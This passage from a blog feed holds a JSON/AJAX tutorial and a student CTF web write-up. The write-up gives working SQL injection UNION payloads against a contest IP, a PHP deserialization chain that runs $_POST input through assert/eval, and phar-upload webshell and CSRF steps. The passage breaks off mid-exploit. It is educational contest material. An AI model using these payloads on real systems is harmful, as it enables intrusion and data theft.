    <summary type="html">&lt;h2 id=&quot;关于我跟着视频做了一个小小的-Java-Web-项目这件事&quot;&gt;&lt;a href=&quot;#关于我跟着视频做了一个小小的-Java-Web-项目这件事&quot; class=&quot;headerlink&quot; title=&quot;关于我跟着视频做了一个小小的 Java Web 项目这件事&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="项目记录" scheme="https://xorex.space/categories/%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Java Web" scheme="https://xorex.space/tags/Java-Web/"/>
    
  </entry>
  
  <entry>
    <title>JSON 和 AJAX</title>
    <link href="https://xorex.space/2021/04/12/f53c59e23e61/"/>
    <id>https://xorex.space/2021/04/12/f53c59e23e61/</id>
    <published>2021-04-12T06:52:42.000Z</published>
    <updated>2021-04-14T09:54:34.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p>关于 JSON 本身的一些信息，可以在：<a href="https://www.xmind.net/m/rc4VPM/">JSON 和 XML 思维导图</a> 查看，这里不在叙述。</p><h3 id="JavaScript-Object-lt-gt-String"><a href="#JavaScript-Object-lt-gt-String" class="headerlink" title="JavaScript Object &lt;-&gt; String"></a>JavaScript Object &lt;-&gt; String</h3><p>在 JavaScript 中，JSON 本身是一个对象，以访问属性的方式访问 JSON 里面的键值对:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> json=&#123;</span><br><span class="line">        <span class="string">&quot;Tempest&quot;</span> : <span class="string">&quot;Xorex&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Yukinoshita&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;Yukino&quot;</span>,</span><br><span class="line">            <span class="string">&quot;age&quot;</span> : <span class="number">18</span>,</span><br><span class="line">            <span class="string">&quot;height&quot;</span> : <span class="number">168</span>,</span><br><span class="line">            <span class="string">&quot;log&quot;</span> : [<span class="string">&quot;Yukinoshita&quot;</span>,<span class="string">&quot;Yukino&quot;</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Yuuki&quot;</span> : <span class="string">&quot;Asuna&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">String</span>=json.Tempest;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">Array</span>=json.Yukinoshita.log;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于前后端进行数据传输的过程中，使用的就是 JSON 字符串进行传输，然后再解析成对象进行使用。在 JS 中对象转字符串使用：<code>JSON.stringify()</code> ，将字符串转为 JSON 使用 <code>JSON.parse()</code> 。</p><h3 id="Java-Object-lt-gt-String"><a href="#Java-Object-lt-gt-String" class="headerlink" title="Java Object &lt;-&gt; String"></a>Java Object &lt;-&gt; String</h3><p>在 Java 端，则使用 Google 提供的 Gson 包的 Gson 对象来对 JSON 进行状态转换。</p><h4 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h4><p>使用对于 JavaBean 来说，只需要在使用 <code>fromJson(String,Class)</code> 生成对象的时候传入 JavaBean 的 Class 对象即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User userTempest=<span class="keyword">new</span> User(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>, <span class="string">&quot;email&quot;</span>);</span><br><span class="line">Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">String jsonString=gson.toJson(userTempest);</span><br><span class="line">User jsonBean=gson.fromJson(jsonString, User.class);</span><br><span class="line">System.out.println(jsonString);</span><br><span class="line">System.out.println(jsonBean);</span><br></pre></td></tr></table></figure><h4 id="包含泛型的对象"><a href="#包含泛型的对象" class="headerlink" title="包含泛型的对象"></a>包含泛型的对象</h4><p>对于一个包含了泛型的对象比如 List 和 Map 来说，使用简单的 getClass() 是没有办法连同里面包含数据的 Class 一起获取的，那么在将 String 的 Json 转化为对应的实例的时候，就无法获取里面真正的泛型对应数据。比如这里 list.getClass() 之后，拿到的仅仅只是 ArrayList 的 Class 对象，导致了后面调用实例内部元素的方法的时候出错。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">JSON</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">    List&lt;User&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Yukinoshita&quot;</span>, <span class="string">&quot;Yukino&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    String jsonString=gson.toJson(list);</span><br><span class="line">    List&lt;User&gt; jsonList=gson.fromJson(jsonString, list.getClass()); <span class="comment">// 这里传入的 Class 不完整</span></span><br><span class="line">    System.out.println(jsonList.get(<span class="number">0</span>).getEmail()); <span class="comment">//导致了获取集合内部元素之后，无法正常使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而正确的做法就是利用 <code>TypeToken&lt;T&gt;</code> 来解决，利用匿名内部类的形式创建一个 <code>TypeToken&lt;T&gt;</code> 的实例，调用其方法 <code>getType()</code> 返回的就是泛型 T 所对应完整的 Class，其对应的代码为：<code>new TypeToken&lt;ArrayList&lt;User&gt;&gt;()&#123;&#125;.getType()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">JSON</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">    List&lt;User&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Yukinoshita&quot;</span>, <span class="string">&quot;Yukino&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    String jsonString=gson.toJson(list);</span><br><span class="line">    List&lt;User&gt; jsonList=gson.fromJson(jsonString, <span class="keyword">new</span> TypeToken&lt;ArrayList&lt;User&gt;&gt;()&#123;&#125;.getType());</span><br><span class="line">    System.out.println(((User)jsonList.get(<span class="number">0</span>)).getEmail());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>AJAX 是 Asynchronous JavaScript and XML 的缩写，意为异步的 JavaScript 和 XML。它可以利用 JavaScript 去服务器获取响应，并在不刷新的条件下，更新页面的内容。这里只讲述一下关于 jQuery 的 AJAX 的使用方法：</p><h3 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax()"></a>$.ajax()</h3><p>这里使用 <code>$.ajax();</code> 方法来进行发起异步请求，其中方法参数为一个 JSON 对象，这个对象有若干可设置参数：</p><ul><li><p>url 表示发起请求的地址</p></li><li><p>type 表示请求的类型 GET ro POST</p></li><li><p>data 表示请求写代的参数，有两种形式 <code>&quot;key=value&amp;key=value&quot;</code> 和 <code>&quot;&#123;key:value&#125;&quot;</code> 两种</p></li><li><p>success 用于绑定一个方法，为响应成功之后执行的方法，方法需要设置一个参数，用于传入 ajax 响应的响应体数据。</p></li><li><p>dataType 用于标识响应的数据类型，”text” “json” “xml” 之类的。当为 text 的时候，数据会转化为字符串类型，json 的时候，会调用 <code>JSON.parse()</code> 将 String 数据会转化为 json 对象。</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;#button&quot;</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">                url:<span class="string">&quot;http://localhost:8080/BookStore/ajax?service=ajax&quot;</span>,</span></span><br><span class="line"><span class="javascript">                type: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">                data: &#123;<span class="attr">name</span>:<span class="string">&quot;Xorex&quot;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                dataType: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="javascript">                success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">&quot;#h1&quot;</span>).text(<span class="string">&quot;我的名字是：&quot;</span>+data.name);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> json=&#123;<span class="attr">name</span>:<span class="string">&quot;Xorex&quot;</span>&#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>发送请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="comment">&lt;!-- 用来显示返回的数据 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="get-or-post"><a href="#get-or-post" class="headerlink" title="$.get() or $.post()"></a>$.get() or $.post()</h3><p>这是一种更加简单的发起 ajax 的方式，直接定义了发送请求方式，填写的 JSON 参数可以更加简洁。</p><p><code>$.get(url,data,function,dataType)</code> 和 <code>$.post(url,data,function,datatype)</code> 不需要构造 json，只需要依次填入参数即可。</p><h3 id="getJson"><a href="#getJson" class="headerlink" title="$.getJson()"></a>$.getJson()</h3><p>更离谱 <code>$.getJson(url,data,function)</code> ，只需要了三个参数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JSON&quot;&gt;&lt;a href=&quot;#JSON&quot; class=&quot;headerlink&quot; title=&quot;JSON&quot;&gt;&lt;/a&gt;JSON&lt;/h2&gt;&lt;p&gt;关于 JSON 本身的一些信息，可以在：&lt;a href=&quot;https://www.xmind.net/m/rc4VPM/&quot;&gt;</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="JSON" scheme="https://xorex.space/tags/JSON/"/>
    
    <category term="AJAX" scheme="https://xorex.space/tags/AJAX/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 Web 题解</title>
    <link href="https://xorex.space/2021/04/11/f1ba598f1f57/"/>
    <id>https://xorex.space/2021/04/11/f1ba598f1f57/</id>
    <published>2021-04-11T15:00:56.000Z</published>
    <updated>2021-04-11T15:27:00.212Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>该正视过去的那段时光了，虽然并不顺利，但也要记录下来，成为博客文章的一员。</p></blockquote><h2 id="1-朋友的学妹"><a href="#1-朋友的学妹" class="headerlink" title="1.朋友的学妹"></a>1.朋友的学妹</h2><p>直接F12即可。</p><h2 id="2-EZwww"><a href="#2-EZwww" class="headerlink" title="2.EZwww"></a>2.EZwww</h2><p>提示的很清楚了，这里直接用脚本去找备份文件，通过返回的状态码很快就找出来备份文件的文件名，然后下载解压就可以拿到 flag 了</p><h2 id="3-刘壮的黑页"><a href="#3-刘壮的黑页" class="headerlink" title="3.刘壮的黑页"></a>3.刘壮的黑页</h2><p>这个下拉到最下面的地方，然后鼠标选择之后能看到php代码，然后代码审计，直接 GET 提交 username=admin 然后 POST 提交 passwd=syclover 就可以了。</p><h2 id="4-Welcome"><a href="#4-Welcome" class="headerlink" title="4.Welcome"></a>4.Welcome</h2><p>这道题目使用GET访问的时候会显示页面是空白的，刚开始我不知道，以为是人太多导致页面加载不出来，就放在一边看后面的题目了。写了后面的题目再打开发现还是无法打开，搜索 405 错误之后就明白了。</p><p>使用 POST 发送请求，然后会看到一段 PHP 代码，发现需要 POST 上传两个参数，要求上传的两个参数 roam1 和 roam2 值必须严格不同，但是他们的md5计算值却必须是相同的。</p><p>使用数组绕过的方法，让两个都为数组，然后赋上不同的值，这样两个数在比较的时候，值严格不同，在计算 md5 比较的时候，又因为两个变量返回的都是 array 所以计算出来的结果都是相同的。这样成功访问到 phpinfo() 页面。</p><p>经过一遍又一遍的阅读这个超级长的php配置信息，大概获得了两个有用的信息：第一个是有一个叫  f14444aaagggg.php 的文件被预先包含在了每一个页面里面，另外一个信息就是会莫名其妙的发起一个和网页地址一样的参数请求，值为空，猜测是 f14444aaagggg.php 文件里执行出来的，觉得这里可能是突破点。</p><p>然后访问网址 +f14444aaagggg.php 什么都没显示出来，各种操作好像都不太行，所以就暂时放弃了。</p><p>brupsuite！</p><p>原来访问的时候抓一个包就好了，flag藏在响应头里面……</p><p>啊这，flag 还能藏在这里面吗……那就有点不懂发起的那个和网页地址一样的请求的目的是干什么了，而且 <code>auto_prepend_file</code> 不是预加载到每一个页面啊，为什么只有访问 f14444aaagggg.php 才会相应出来 flag 啊，好迷啊。</p><h2 id="5-EZgit"><a href="#5-EZgit" class="headerlink" title="5.EZgit"></a>5.EZgit</h2><p>题目里面很清楚的提示了要使用 Githack，在搜查资料了解了什么是 Githack 和 git 版本泄露之后，就开始下载安装开搞，搞下来之后就找 flag 文件，里面说版本过老，然后用命令切换版本之后再打开就能拿到 Flag 了。</p><h2 id="6-我是大黑客"><a href="#6-我是大黑客" class="headerlink" title="6.我是大黑客"></a>6.我是大黑客</h2><p>下载下来备份文件，然后解压，PHP 文件里面只有一行代码，发现了 eval 和 POST，然后其他的都没有了。搜索了 eval 之后大概明白了是命令注入，然后注入了半天都不知道去哪里拿 Flag。后来搜了搜才知道有种东西叫作一句话木马，有一种工具叫作网站管理工具。下载了蚁剑，学了下基本用法之后成功连接一句话木马。</p><p>之后大概就进入了一个 Linux 命令窗口的地方，只需要用简单的 Linux 命令就可以找到 flag 文件了。</p><h2 id="7-ezbypass"><a href="#7-ezbypass" class="headerlink" title="7.ezbypass"></a>7.ezbypass</h2><p>这里首先让使用 GET 请求上传一个 a 和 b ，要求 a 和 b 值不相等，但是他们使用 strcmp() 函数比较却要求相等（返回零）。这里可以利用这个传入的数据要求是字符串类型，但是传入一个非字符串之后会报错然后返回 0（同样表示相等），这样就绕过了。 但是需要注意的是，这里对 php 的版本是有要求的，必须高于 5.3 版本才行。</p><p>然后会进入第二个页面，要求使用 POST 传入一个值 c 要求这个值，类型不能是数字，但是必须等于123，提交了 c=”123” 之后发现不可以，看来是使用严格判断 === 了， 猜测直接输入表达式，试了 122+1 不行，但是 123+1 就可以了，好奇怪啊。</p><h2 id="8-Flagshop"><a href="#8-Flagshop" class="headerlink" title="8.Flagshop"></a>8.Flagshop</h2><p>这道题目做的真的是爽的要死，打开网页之后大概看了一下整个网站的全貌，就是拿钱买 Flag（浪爷的网页真好看）。但是初始账号里面只有 10 块钱，买 Flag 需要 10000M 块钱，最开始我把 10000M 看成了一万块，就想写一个脚本，然后注册 1000 个账号，向主账号里面把钱都转过去，然后拿钱买 Flag，写了一半发现不太好写，就开始考虑各种奇奇怪怪的方法，比如 SQL 注入来登录浪爷的账号买 Flag 什么的。</p><p>都不行之后开始在网站上漫无目的开始找资料，发现了有一道 CTF 的题目和这个很像，都是转账然后买 Flag ，想要套用这个思路但是发现不太行，它的那个是用注入的方法修改转账逻辑，让初始用户都转帐给它。然而这道题目连转账的 API 都找不到。</p><p>当时主要是不太明白报告里面想要传达的内容，虽说在找资料的时候看到了有关 CSRF 攻击文章，但是没有反应过来。终于等到了浪爷放出了 hint ，就是 CSRF，好家伙，经过阅读了好几篇 CSRF 的文章和看了好几遍整个网站之后，大概理清楚了可能的攻击原理，整个网站的设计都是有一定含义的。浪爷账号的 INF ，转账系统，留言板里面“会查看报告里的链接的”，原来是要从浪爷的账号里要钱。</p><p>然后开始抓转账的包，确定格式，学 HTML 写网页，找了个代码托管平台传了上去并开通 Page 服务。经过反复的试验之后，成功搞出来了一个能用的连接：<a href="https://xorex.gitee.io/">https://xorex.gitee.io/</a> 。暴力枚举 MD5 获得验证码，然后交报告给浪爷之后，果然激活了，从浪爷的钱包里拿到了 1E19 的钱，买到了新爱的 Flag！（还买了蹭饭卡和啊这 EGG{@_2h3_zh3_60_5h1_ro4_dan_chon9ji} ）</p><h2 id="9-忏悔的刘壮"><a href="#9-忏悔的刘壮" class="headerlink" title="9.忏悔的刘壮"></a>9.忏悔的刘壮</h2><p>提交几个忏悔之后，都是刘壮这次没做，最后出现要求三秒钟之内提交，应该就是 Python 脚本题了。</p><p>尝试几次之后，成功猜对一个，然后忏悔数量加一，盲猜应该要忏悔很多次才行。</p><p>然后开始摸索脚本的格式，刚开始请求一直出现 500 错误，然后根据跳转的各个页面找到每个页面的提交格式，然后使用 Session 来保持持续的忏悔，使用 Cookie 里面记录的忏悔答案来提交，保证每次忏悔都对，之后让脚本不停的跑就可以了，最后输出 Flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL1=<span class="string">&quot;http://120.79.197.4:5000/&quot;</span></span><br><span class="line">URL2=<span class="string">&quot;http://120.79.197.4:5000/check&quot;</span></span><br><span class="line">Mysession=requests.session()</span><br><span class="line">Response=Mysession.get(URL1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Cookie=Response.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>][<span class="number">7</span>]</span><br><span class="line">    Data=&#123;<span class="string">&#x27;answer&#x27;</span>:Cookie&#125;</span><br><span class="line">    Response=Mysession.post(URL2,data=Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;SYC&#x27;</span> <span class="keyword">in</span> Response.text:</span><br><span class="line">        print(Response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">       </span><br></pre></td></tr></table></figure><h2 id="10-Myblog"><a href="#10-Myblog" class="headerlink" title="10.Myblog"></a>10.Myblog</h2><p>又是浪爷的题目，爱了爱了。</p><p>刚开始以为是SQL注入，试了好几次什么有价值的回显都没有，暂时搁置了一小段时间。</p><p>后来去观察网页的 URL 确定每个不同的页面是怎样传进去的，然后发现了 index.php 页面是通过 page 的值确定显示的页面。猜测可能使用了文件包含，是传入文件名之后拼接上后缀然后包含。</p><p>试了试果然存在 home.php 和 login.php 页面。</p><p>使用 <code>php://filter</code> 来把这些页面的源码弄下来，在 login.php 里发现了登录成功之后显示的页面 admin/user.php 和 password 生成器（竟然是随机的啊）</p><p>大概查了查资料，结合 admin/user.php 文件里面的代码。明白了这道题怎么利用 Session 的（之前以为 Session 就是 Cookie 的一部分）。然后就是抓包，分析跳转逻辑和账号密码验证逻辑，想到了绕过方法。</p><p>既然随机密码谁都不知道，那么就不让设置密码，POST提交的 Password 也为空，就可以绕过密码比对了。不设置密码只需要带着一个全新的 SessionID，不经过设置密码界面 login.php ，直接提交数据给验证页面 admin/user.php 就可以了（这下操作只能在 Burp 上面实现了）</p><p>操作成功返回了博客后台界面，然后开始读文件上传代码，发现只验证后缀和类型满足是个图片就可以了。还发现了几个页面，但是把代码弄下来之后也没有发现什么有用的信息。</p><p>然后就是上传文件，因为只能是图片文件，所以构造图片马，利用 phar 协议在打开phar文件的时候会执行里面的 php 代码，可以写一些恶意 PHP 代码封装在自己生成的 phar 文件里面，然后在 index.php 页面的 page 参数里面输入 phar 协议来打开这个文件就可以了。</p><p>然后先构造包含上传图片（ phar 改后缀为 jpg ）的上传包，发送之后看回显的上传文件名称，然后在另外一个浏览器使用 phar 协议打开并执行它。</p><p>然后就开始使用各种 PHP 代码来尝试，比如输出 index.php 的代码，查看 phpinfo() 文件（不停发包真的麻烦），试了半天，突然想到我好像有一种东西叫做蚁剑，然后链接上之后就在主目录里面找到了 Flag。</p><p>浪爷的题目好棒啊！！！！</p><h2 id="11-带恶人六撞"><a href="#11-带恶人六撞" class="headerlink" title="11.带恶人六撞"></a>11.带恶人六撞</h2><p>这一看就是 SQL 注入，首先排除数字查询确定是字符查询，然后经过尝试和猜测得出闭合方式是单引号闭合，where 查询输入的 ID 然后然后输出，构造的 SQL 语句很简短。</p><p>有报错回显，用了一下 <code>updatexml()</code> 直接给我回了一个 <code>Hakcer？</code> 看来是被禁用了，但是其他方法的报错注入都没被禁。</p><p><code>--</code> 注释没有被禁   但 <code>--</code> 的末尾空格被禁了。 但是可以这样： <code>-- /**/</code> 来保证 <code>--</code> 后面还有一个空格，成功达成注释效果，后来发现根本不需要注释，末尾应该只有一个 <code>&#39;</code> 所以直接多一个 <code>&#39;</code> 和它一起闭合就可以了。</p><p>使用 <code>union select 1,2,3,4</code> 发现是 1号/2号/4号 通道回显，分别存储着 事件 ID (应该就是 SQL 的 where 查询用的列)，标题和文章链接。</p><p>database 获得当前数据库名称为 geek_sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3,database() &#x27;</span></span><br></pre></td></tr></table></figure><p>好了开始翻出来表名有 blog 和 fllllag ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>geek_sql<span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure><p>搞列名，有两个id 和 fllllllag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>geek_sql<span class="string">&#x27; and table_name=&#x27;</span>fllllag<span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure><p>Flag 到手！</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(id),group_concat(fllllllag) from fllllag -- /**/</span></span><br></pre></td></tr></table></figure><p>还看到了： <code>longlone_need_gf</code> ，浪爷这么棒的人，肯定会找到属于自己的幸福的啊！</p><h2 id="12-pop-chain-epic"><a href="#12-pop-chain-epic" class="headerlink" title="12.pop chain epic"></a>12.pop chain epic</h2><p>复习了好一会反序列化、继承和静态变量的知识。</p><p>首先找到最后能拿到 Flag 的突破口，然后一步一步往前推就好了。（感谢马师傅 UN8 的训练！）开始以为可能是在 <code>call_user_func($this-&gt;aaa[&quot;object&quot;])</code>  因为可以调用 eval 或者 assert ，但是这需要往里面塞入两个参数，感觉这里不太行。</p><p>继续看发现了可爱的 <code>$this-&gt;aaa[1]($this-&gt;aaa[2]);</code> 这个东西给 <code>$aaa</code> 扔一个 <code>array(&#39;eval&#39;,&#39;$post[&quot;attack&quot;]&#39;)</code> 就可以逛服务器了（实际上是不可以的），这里需要注意的是 “attack” 必须使用双引号括住，因为序列化是不支持单引号的（血和泪的教训）！！！</p><p>但是这些前提就是必须绕过 pop 类中的 <code>__wakeup()</code> 才可以，方法就是在序列化对象的属性数量 +1，超过 pop 类最大属性数量就可以绕过 <code>__wakeup()</code> 方法，不去执行清空语句了。（搜了搜原来这是个CVE 啊）</p><p>执行一句话木马前提就是 <code>call_user_func($this-&gt;aaa[&quot;object&quot;]);</code>  返回的值是 true 才行 这样第二次循环就轮到执行木马了。盯了一圈，发现了了 <code>private $AFKL</code> 属性 ，可以在 <code>$AFKL</code> 设置初始值，然后通过 epic 类中的 <code>__call()</code> 方法中的 <code>$this-&gt;aaa-&gt;$name($params)</code> 来调用从父类 chain 中继承而来的 <code>getAFKL()</code> 方法。</p><p>思路大概就是这样，但是很奇怪的是 <code>__invoke()</code> 方法在这个过程中并没有被使用（当该类的实例化对象被当做函数调用的时候激活）  </p><p>有很多细节是需要注意的：</p><ul><li><p>如果含有 protected 和 private 属性序列化，在对序列化对象进行移动的时候，在本机使用 base64编码。</p></li><li><p>在构造一句话木马的地方是 <code>$a($b)</code> ，$a 为想要调用函数的名称，$b 是想要传入的参数。被称为可变函数。php 会自动寻找和它同名的函数并执行，但是不可以调用语言结构（ php 关键词，语法的一部分）。非常可惜的是一句话木马里面常用的 eval() 是一个语言构造器，无法通过可变函数调用，因此只能使用 assert()</p></li><li><p>eval() 实质性是一个语言构造器，只有一个参数，将接受合法php代码执行。而 assert() 会把整个字符串都当成代码进行执行。</p></li><li><p>将接受参数的语句 <code>&#39;$_POST[&quot;attack&quot;]&#39;</code> 的引号是固定的，因为外层的单引号回将语句当成单纯的字符串而不是魔法常量，内层的双引号可以成功反序列化（单引号会有问题）</p></li><li><p>assert() 在实际执行代码的时候，不知道为什么会有各种奇奇怪怪的错误，所以就直接这样构造了：<code>assert(eval($_POST[&quot;attack&quot;]));</code> 本质上是 eval() 在执行 post 上传的代码。</p></li><li><p>在使用 assert() 连接蚁剑的时候，需要使用 base64 编码模式，不然返回数据为空。</p></li></ul><p>有了明确的思路和细节之后，就可以写代码序列化，然后上传网页之后，用蚁剑连接，在根目录找到了 flag 文件。</p><p>序列化代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pop</span> </span>&#123;</span><br><span class="line">    <span 